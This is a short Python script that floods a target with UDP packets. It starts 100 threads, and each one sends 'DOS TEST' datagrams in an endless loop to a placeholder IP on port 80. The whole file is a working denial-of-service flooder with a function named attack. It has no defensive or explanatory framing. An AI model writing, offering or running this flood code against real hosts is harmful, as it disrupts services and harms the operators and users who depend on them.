import socket
import threading

threads = 100
global runningThreads
runningThreads = 0

port = 80
target = "ip"

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"DOS TEST", (target, port))

for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
    runningThreads += 1
    